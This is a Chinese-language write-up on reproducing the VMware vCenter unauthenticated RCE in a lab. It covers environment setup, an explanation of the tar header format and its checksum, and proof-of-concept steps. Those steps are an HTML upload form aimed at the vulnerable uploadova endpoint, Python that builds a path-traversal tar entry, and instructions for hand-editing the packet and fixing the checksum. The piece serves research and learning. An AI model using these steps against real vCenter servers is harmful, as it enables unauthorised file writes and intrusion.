<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [paper.seebug.org](https://paper.seebug.org/1500/)

> 作者： 图南 & Veraxy @ QAX CERT 原文链接：https://mp.weixin.qq.com/s/eamNsLY0uKHXtUw_fiUYxQ

**作者： 图南 & Veraxy @ QAX CERT  
原文链接：[https://mp.weixin.qq.com/s/eamNsLY0uKHXtUw_fiUYxQ](https://mp.weixin.qq.com/s/eamNsLY0uKHXtUw_fiUYxQ)**

好久不见，已经很久没有写文章了，但我还有一颗想写文章的心。漏洞的复现总是冲着最终的目标去不断尝试，但是其中肯定会遇到很多疑问。每次遇到疑问都会挖一些坑留着通过学习慢慢填，但因为工作性质变更的原因，很多坑留着也就留着了，填的很少。最近逼着自己去填一点坑，至少作为笔记积累一些知识，然后有机会写出来讲明白它（讲真我一直觉得讲明白一件事儿比自己明白更难且更耗时间）虽然刚刚填了一个，也算是良好的开始吧，至少让大家知道我还没有丢掉安全研究。那么就从 vCenter RCE 漏洞开始吧。

对了，文章不包含深入的漏洞分析，因为漏洞分析部分漏洞的发现者已经写的相当详细了，看 [Unauthorized RCE in VMware vCenter](https://swarm.ptsecurity.com/unauth-rce-vmware/) 这篇文章即可。

0x00 文章导航
---------

### 避开所有坑快速复现这个漏洞

可浏览 **0x01 漏洞环境搭建**——> **按照以下方式搭建一定能成功**和 **0x02 漏洞 PoC 构造**——> **按照以下方式构造一定能成功**

### 通过问题引导方式浏览

如果你也遇到了类似问题看这里

_搭建环境总是失败_

浏览 **0x01 漏洞环境搭建**——> **坑 1: 此方法不要使用 7.0.x 的 iso 镜像，会有一个无解的 BUG！**

**坑 2: 虚拟机网络适配器选择 NAT 模式无法保存主机名**

_手动修改上传数据包导致失败和使用 macOS 的 tar 打包会出问题_

浏览 **0x02 漏洞 PoC 构造**——> **坑 2：为什么不能直接修改数据包？**

**~为什么会有 zip 的 PoC，原因是什么？~**（这个没空研究了，大佬们继续～）

### 文章参考

1.  [https://en.wikipedia.org/wiki/Tar_(computing)](https://en.wikipedia.org/wiki/Tar_(computing))
2.  [https://swarm.ptsecurity.com/unauth-rce-vmware/](https://swarm.ptsecurity.com/unauth-rce-vmware/)
3.  [https://www.gnu.org/software/tar/manual/html_node/Standard.html](https://www.gnu.org/software/tar/manual/html_node/Standard.html)
4.  [https://www.freebsd.org/cgi/man.cgi?query=tar&apropos=0&sektion=5&manpath=FreeBSD+7.0-RELEASE&arch=default&format=html](https://www.freebsd.org/cgi/man.cgi?query=tar&apropos=0&sektion=5&manpath=FreeBSD+7.0-RELEASE&arch=default&format=html)

0x01 漏洞环境搭建
-----------

遇到一个漏洞，我总会想这个应用 / 软件 / 产品在生产环境中跑起来是什么样子的，小一点的还好说，我能想象到一些使用场景，但是大一点的和我接触不深的领域就比较苦恼了。vCenter 默认和 ESXi 搭配使用，这里强烈建议大家有条件去搭建 ESXi 和 vCenter 配合使用。可参考：[【Vmware 学习教程五】VMware vCenter 6.7 安装及群集配置介绍（一）](https://www.miensi.com/352.html) 但是这两个都是大家伙，消耗内存非常大，我没有继续研究这两个大家伙配合的情况（qiong，高配电脑太贵了），下面介绍一种相对快速的搭建方式。

### 按照以下方式搭建一定能成功

**第一阶段安装**

从 [VMware 官网](https://my.vmware.com/group/vmware/patch#search)下载 VMware-VCSA-all-6.7.0-17028579.iso，一定先下载这个版本不要下载 7.0，为啥不能下 7.0 后面会讲到。

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-15-47-51.png-w331s)

然后挂载 ISO 文件后会看到有个 ova 文件：

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-15-52-15.jpg-w331s)

我们要用将它导入到 VMware 虚拟机安装，我这里用的 VMware Fusion Player 12.0.0：

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-15-56-36.png-w331s)

部署选项选择 Tiny 即可：

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-15-58-24.jpg-w331s)

然后按照引导安装，网络配置参考宿主机，设置成相同的网段、相同的网关和 DNS，以便后续顺利访问。 假如宿主机 IP 为`192.168.18.2`（[ZoomEye 搜索结果](https://www.zoomeye.org/searchResult?q=192.168.18.2)），网关和 DNS 均为`192.168.18.1`（[ZoomEye 搜索结果](https://www.zoomeye.org/searchResult?q=192.168.18.1)），子网掩码为`255.255.255.0`（[ZoomEye 搜索结果](https://www.zoomeye.org/searchResult?q=255.255.255.0)）, 那么我们就设置如下：

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-16-07-28.jpg-w331s)

然后配置 SSO 用户密码、root 用户和密码，即可完成安装。 这里有个**小坑**：root 用户名和密码不要很复杂，我这里用的 root/root。之前设置了有大小写和特殊字符的密码死活登录不上，我以为我自己把密码忘记了，但是重装依然不行，暂不明原因，这个不深究了。

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-16-10-06.jpg-w331s)

然后再继续即可导入成功，虚拟机会自动启动进行初始化。

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-16-10-37.jpg-w331s)

此时查看下虚拟机网络适配器模式应为桥接模式，不用更改。初始化 OK 了如下图：

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-16-12-10.jpg-w331s)

此时域名为 photon-machine，我们没有对应的 DNS，所以手动修改域名为刚才设置的 IP（192.168.18.5（[ZoomEye 搜索结果](https://www.zoomeye.org/searchResult?q=192.168.18.5)））。按 “F2” 手动修改域名，“enter”进入网络配置：

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-16-14-06.jpg-w331s)

进入 DNS 配置将主机名从默认的 photon-machine 修改为 IP 地址（192.168.18.5（[ZoomEye 搜索结果](https://paper.seebug.org/1500/192.168.18.5)））：

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-16-27-39.jpg-w331s)

然后重启网络，等一会儿：

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-16-28-04.jpg-w331s)

回到了刚刚的页面，这时之前的域名已经变成了 IP：

![](https://images.seebug.org/content/images/2021/03/11/1615428655000-2021-03-06-16-46-38.jpg-w331s)

至此第一阶段安装已经完成了，这个过程顺利的话 5 分钟搞定，主要时间花费在第一次启动虚拟机初始化的过程。

**第二阶段安装**

访问`https://192.168.18.5:5480/`继续配置： ![](https://images.seebug.org/content/images/2021/03/11/1615428656000-2021-03-06-16-51-43.jpg-w331s) 选择设置后用 root 账号登陆： ![](https://images.seebug.org/content/images/2021/03/11/1615428656000-2021-03-06-16-51-57.jpg-w331s) 按照向导继续配置，注意在网络配置阶段把系统名称修改为 IP： ![](https://images.seebug.org/content/images/2021/03/11/1615428656000-2021-03-06-16-53-33.jpg-w331s) 这里又有一个**小坑**，系统名称这里应该会检查是否能真正访问到这个地址，所以我们使用桥接模式，前面修改主机名为 IP 地址的操作都是为了这一步能顺利，否则这里很容易出现 “无法保存主机名” 的错误。 然后设置 SSO 密码，一路下一步，就基本不会再遇到什么坑了。 第二阶段开始安装的时候基本就是纯等待，会比较慢，去喝口水、冲杯咖啡、泡个茶、吃个饭、睡一觉吧…… ![](https://images.seebug.org/content/images/2021/03/11/1615428656000-2021-03-06-16-58-45.jpg-w331s) 第二阶段安装完成会打开 443 端口，就可以正常访问 vCenter 也可以正常调漏洞了。

### 坑 1: 此方法不要使用 7.0.x 的 iso 镜像，会有一个无解的 BUG！

在刚开始复现漏洞的时候，我很自然的选择了修复版本的前一个受影响版本：7.0.1，**但是第二阶段安装无论使用什么域名和什么 IP 地址作为系统名称，都会出现无法保存 IP 设置的错误**： ![](https://images.seebug.org/content/images/2021/03/11/1615428656000-2021-03-06-17-07-55.jpg-w331s) 抱着有问题一定是我的问题的想法重装、改配置、再重装、再改配置、再重装、再改配置。。。都无法解决这个问题。最后我去谷歌搜到了这样的结果： ![](https://images.seebug.org/content/images/2021/03/11/1615428656000-2021-03-06-17-09-15.png-w331s) 翻译下来就是在浏览器中通过 5480 端口进行网络配置会报错无法保存 IP 设置，（正常安装应该不会有类似问题）解决方案：无…… 快速搭环境的话绕开 7.0.x 吧。

### 坑 2: 虚拟机网络适配器选择 NAT 模式无法保存主机名

这个坑应该是我配置的问题吧，可能不算普遍但是已经有两个人遇到了相同问题了，表现为无论如何改主机名都提示无法保存主机名，也尝试过改其他网络配置、DNS 等，没有解决，遂使用桥接模式绕开。 ![](https://images.seebug.org/content/images/2021/03/11/1615428656000-2021-03-06-17-19-42.jpg-w331s)

0x02 漏洞 PoC 构造
--------------

### 按照以下方式构造一定能成功

**使用 HTML 构造文件上传页面**

漏洞刚传出来还没有什么细节的时候，我就从一些截图中注意到了`Content-Type: multipart/form-data`，不同于传统的 Form 表单`application/x-www-form-urlencoded`，`multipart/form-data`更适合发送大量二进制数据（文件）或非 ASCII 数据。关于这两种 Content-Type 的详细信息，可阅读 W3C 的相关文档 [Forms](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4)。 根据漏洞触发点的代码可以得知，需要构造一个使用`multipart/form-data`的文件上传，并且上传控件的 name 应为`uploadFile`： ![](https://images.seebug.org/content/images/2021/03/11/1615428656000-2021-03-07-00-03-49.jpg-w331s)

所以可以直接构造一个上传控件直接上传文件到漏洞点：

```
<html>
  <body>
    <form id="upload-form" action="https://192.168.18.5/ui/vropspluginui/rest/services/uploadova" method="post" enctype="multipart/form-data" >
      　　　<input type="file" id="upload"  /> <br />
      　　　<input type="submit" value="Upload" />
    </form>
  </body>
</html>
```

**使用代码构造 tar 文件**

继续看漏洞触发点代码，可以看出真正导致解压文件到任意路径的`entry.getName()`目的是迭代每一个压缩实体时获取文件名，可能这样说并不清楚，举个例子，文件 a.txt 和文件 b.txt 被压缩到了文件 c.tar，在解压时会分别获取 c.tar 中的`a.txt`文件名和`b.txt`文件名，拼接到了`/tmp/unicorn_ova_dir`中。那么若将 a.txt 换成`../a.txt`就将 a.txt 这个文件释放到了`/tmp`目录下。

![](https://images.seebug.org/content/images/2021/03/11/1615428656000-2021-03-07-00-35-03.png-w331s)

但是实际上你很难创建一个名为`../a.txt`的文件并将其压缩成 tar，所以可以通过以下代码去创建一个压缩包并释放到我们想释放的地方：

```
import tarfile
import os
from io import BytesIO

with tarfile.open("test.tar", 'w') as tar:
    payload = BytesIO()
    data = 'hacked_by_tunan'
    tarinfo = tarfile.TarInfo(name='../../home/vsphere-ui/hacked_by_tunan')
    f1 = BytesIO(data.encode())
    tarinfo.size = len(f1.read())
    f1.seek(0)
    tar.addfile(tarinfo, fileobj=f1)
    tar.close()
    payload.seek(0)
```

这里面有两个坑，**小坑 1：我们不能直接将文件释放到根目录下**，因为这个接口只有`vsphere-ui`用户的权限，我们只能释放到`vsphere-ui`用户能写入文件的地方。**大坑 2：我们不能通过 BurpSuite 等工具直接改数据包**，这个坑我要详细讲一讲。

### 坑 2：为什么不能直接修改数据包？

假如我们自己使用 Linux 打包 tar，然后上传抓包，可以看到这样的数据包：

![](https://images.seebug.org/content/images/2021/03/11/1615428656000-2021-03-07-18-22-04.png-w331s)

明白了漏洞原理，很容易就会想到直接将最开始的文件名改成`../`的形式去释放到对应的目录，但是最终会返回 FAILED：

![](https://images.seebug.org/content/images/2021/03/11/1615428657000-2021-03-07-22-48-25.png-w331s)

我相信复现漏洞卡在这里的肯定不在少数，为什么会这样呢？这里需要深入研究一下 tar 文件了。

### tar 文件构成

我们不妨使用任意 HAX 编辑器打开我们的 tar 压缩文件看一看：

![](https://images.seebug.org/content/images/2021/03/11/1615428657000-2021-03-07-18-25-26.png-w331s)

看起来挺乱的？不慌，按照 FreeBSD 的文档和源码对比分解一下即可，并不难。

众所周知，tar 文件可以将一个或多个文件或目录打包成一个单独的文件，作为一个通用的文件格式，需要保证任何系统和软件都能正确的解释文件 tar 文件的每个字节的定义必须明确。

**tar 文件是由一系列文件对象组成**，每个文件对象包含一个 **512 字节的头**和**实际文件数据**。本着如无必要，勿增实体的原则，我们本文只讨论上面`poc.tar`单个文件的头部分。

头部分分别包含以下内容：

<table><thead><tr><th>名称</th><th>释义</th><th>占用字节</th><th>字段含义</th></tr></thead><tbody><tr><td>name</td><td>文件名 / 路径名</td><td>100</td><td>以空值结尾的字符串，可以是文件名也可以是路径名</td></tr><tr><td>mode</td><td>文件模式</td><td>8</td><td>八进制数字表示的文件格式，一般为三种不同用户类型和三种不同权限的组合，常见的有 644、777 等</td></tr><tr><td>uid</td><td>用户 ID</td><td>8</td><td>八进制表示的文件所有者用户 ID</td></tr><tr><td>gid</td><td>群组 ID</td><td>8</td><td>八进制表示的文件所有者群组 ID</td></tr><tr><td>size</td><td>文件大小</td><td>12</td><td>八进制表示的文件大小</td></tr><tr><td>mtime</td><td>文件修改时间</td><td>12</td><td>从 1970 年 1 月 1 日到文件修改时间的秒数，八进制表示</td></tr><tr><td><strong>checksum</strong> （划重点）</td><td>头的校验和</td><td>8</td><td><strong>为六个 ASCII 八进制数字后面跟一个空（0x00）和一个空格（0x20）若计算头的校验和，需要先将 512 字节头中的校验和字段的每个字节全部设置为空格（0x20），然后再将所有头部字节全部相加，输出为无符号整型，转换成八进制填充到前 6 字节中</strong></td></tr><tr><td>typeflag</td><td>存档文件类型</td><td>1</td><td>类型指示作用，早期版本为 linkflag，0 为常规文件，1 为硬链接，2 为符号连接、3 为字符特殊文件等</td></tr><tr><td>linkname</td><td>链接名</td><td>100</td><td>链接文件名，常规文件为空<code>0x00</code></td></tr><tr><td>magic</td><td>魔术头</td><td>6</td><td>固定为<code>ustar</code>跟一个空格<code>0x20</code>（版本不同会有所不同）</td></tr><tr><td>version</td><td>版本</td><td>2</td><td>固定为空格<code>0x20</code>后面跟一个空<code>0x00</code>（版本不同会有所不同）</td></tr><tr><td>uname</td><td>用户名</td><td>32</td><td>以空值结尾的字符串，用来表示用户名</td></tr><tr><td>gname</td><td>群组名</td><td>32</td><td>以空值结尾的字符串，用来表示群组名</td></tr><tr><td>devmajor</td><td>设备主编号</td><td>8</td><td>字符设备或块设备输入的主要编号</td></tr><tr><td>devminor</td><td>设备次编号</td><td>8</td><td>字符设备或块设备输入的次要编号</td></tr><tr><td>prefix</td><td>前缀</td><td>155</td><td>路径名前缀，如果第一部分 name 中的路径名过长，大于 100 字节，可以将其以任意<code>/</code>字符拆分，放置于此处。解析器应将其拼接获取完整路径名</td></tr><tr><td>pad</td><td>填充</td><td>12</td><td>为了凑完整的 512 字节，填充 12 个字节的<code>0x00</code></td></tr></tbody></table>

那么我们可以把上面的文件分解如下：

<table><thead><tr><th>字段</th><th>值</th><th>值（ASCII 表示）</th></tr></thead><tbody><tr><td>name</td><td>0x2E 0x2F 0x31 0x2E 0x74 0x78 0x74 0x00……</td><td>./1.txt</td></tr><tr><td>mode</td><td>0x30 0x30 0x30 0x30 0x36 0x34 0x34 0x00</td><td>0000644</td></tr><tr><td>uid</td><td>0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x00</td><td>00000000</td></tr><tr><td>gid</td><td>0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x00</td><td>00000000</td></tr><tr><td>size</td><td>0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x32 0x30 0x00</td><td>00000000020</td></tr><tr><td>mtime</td><td>0x31 0x34 0x30 0x32 0x31 0x31 0x32 0x34 0x32 0x31 0x30 0x00</td><td>14021124210</td></tr><tr><td>checksum</td><td>0x30 0x31 0x30 0x35 0x36 0x35 0x00 0x20</td><td>010565</td></tr><tr><td>typeflag</td><td>0x30</td><td>0</td></tr><tr><td>linkname</td><td>0x00 0x00……</td><td>——</td></tr><tr><td>magic</td><td>0x75 0x73 0x74 0x61 0x72 0x20</td><td>ustar</td></tr><tr><td>version</td><td>0x20 0x00</td><td></td></tr><tr><td>uname</td><td>0x72 0x6F 0x6F 0x74 0x00 0x00……</td><td>root</td></tr><tr><td>gname</td><td>0x72 0x6F 0x6F 0x74 0x00 0x00……</td><td>root</td></tr><tr><td>devmajor</td><td>0x00 0x00……</td><td>——</td></tr><tr><td>devminor</td><td>0x00 0x00……</td><td>——</td></tr><tr><td>prefix</td><td>0x00 0x00……</td><td>——</td></tr><tr><td>pad</td><td>0x00 0x00……</td><td>——</td></tr><tr><td>filecontent</td><td>0x68 0x61 0x63 0x6B 0x65 0x64 0x5F 0x62 0x79 0x5F 0x74 0x75 0x6E 0x61 0x6E 0x00 0x00……</td><td>hacked_by_tunan</td></tr></tbody></table>

再次看一下刚才那个文件在 HAX 编辑器下的截图是不是瞬间就不那么懵了？

![](https://images.seebug.org/content/images/2021/03/11/1615428657000-2021-03-07-23-55-21.png-w331s)

**那么详细说一下刚才划重点的 checksum**，这个位置是整个头部的校验和，想计算它的值，需要先把这 checksum 这八位填充为空格（0x20）然后再把整个头部字节相加成无符号整型，然后再换算成八进制，填充到 checksum 字段的前六位，第七位和第八位分别填充空（0x00）和空格（0x20），即组成了完整的文件头部。

所以我读 tar 的各种实现的时候可以看到这样的代码：

```
def calc_chksums(buf):
    """Calculate the checksum for a member's header by summing up all
       characters except for the chksum field which is treated as if
       it was filled with spaces. According to the GNU tar sources,
       some tars (Sun and NeXT) calculate chksum with signed char,
       which will be different if there are chars in the buffer with
       the high bit set. So we calculate two checksums, unsigned and
       signed.
    """
    unsigned_chksum = 256 + sum(struct.unpack_from("148B8x356B", buf))
    signed_chksum = 256 + sum(struct.unpack_from("148b8x356b", buf))
    return unsigned_chksum, signed_chksum

# …… #

buf = struct.pack("%ds" % BLOCKSIZE, b"".join(parts))
        chksum = calc_chksums(buf[-BLOCKSIZE:])[0]
        buf = buf[:-364] + bytes("%06o\0" % chksum, "ascii") + buf[-357:]
# …… #
```

还有这样的代码：

```
unsigned int calculate_checksum(struct tar_t * entry){
    // use spaces for the checksum bytes while calculating the checksum
    memset(entry -> check, ' ', 8);

    // sum of entire metadata
    unsigned int check = 0;
    for(int i = 0; i < 512; i++){
        check += (unsigned char) entry -> block[i];
    }

    snprintf(entry -> check, sizeof(entry -> check), "%06o0", check);

    entry -> check[6] = '\0';
    entry -> check[7] = ' ';
    return check;
}
```

还有我手写的计算已生成文件头部校验和的代码

```
const fs = require('fs');

fs.readFile('test.tar', function (err, data) {
  if (err) throw err;
  const headers = data.slice(0, 512);
  const body = data.slice(512);
  let sum = 8 * 0x20
  for (let i = 0; i < 148; i++)
    sum += headers[i]
  for (let i = 156; i < 512; i++)
    sum += headers[i]
  console.log(sum.toString(8));
})
```

**那么刚才的数据包是真的不能手动改么？非也！**同时修改文件名部分和校验和即可。以下是数学题：

假如我们将`./1.txt`修改为`../1.txt`使其进入`/tmp`目录下，已知`.`**十六进制**表示为`0x2E`，原校验和为 _八进制_ `10565`。 原始数据包`name`字段去掉一位空字节（0x00）补上`.`（0x2E），然后重新计算校验和。换算 _八进制_ 原校验和`10565`到**十六进制**`0x1175`加**十六进制**`0x2E`得`0x11A3`，再换算成 _八进制_ `10643`…… 很快啊，新的校验和出来了！

大胆修改数据包吧！

![](https://images.seebug.org/content/images/2021/03/11/1615428657000-2021-03-07-23-05-38.png-w331s)

那么关于在 macOS 上使用自带 tar 软件打包后修改包失败问题，也是校验和错误的问题。他们都遵守了相同的规范，自行调试下即可。

0x03 总结 & 尾巴
------------

这个漏洞从原理到复现都不算难，所以文章本身没有什么创新的，更像是我的一点研究笔记并想办法将我研究的内容讲出来讲明白，或者能帮助大家解答一些之前复现时候的疑问让大家看了能恍然大明白也算这篇文章的一点贡献。通过这篇文章，我也想传递一种观点，漏洞研究其实不应该只盯着漏洞本身，漏洞可以扩展的知识点太多了：  
**偏应用一点：**了解这个软件 / 组件 / 中间件是干什么的的、尝试搭建起来写点代码看看他们跑起来的样子。  
**偏底层一点：**研究漏洞接触到的相关知识点，可能是 Linux/Windows 相关的，文件相关的，甚至是某个协议规范、某个算法的实现、某个数据结构、某种设计思想。  
**偏攻击一点：**漏洞如何 EXP 化、如何回显搞定不出网的环境、如何让内网设备无感知攻击的存在、如何加载内存马等。  
**偏漏洞挖掘：**去找一下类似的利用点，或者这个新的软件 / 组件 / 中间件是否能带给你一些新的漏洞挖掘思路。  
…… 总之太多知识和事情可以从一个漏洞扩展出来，学海无涯，技术无边，学无止境，你我共勉。

![](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg) 本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1500/](https://paper.seebug.org/1500/)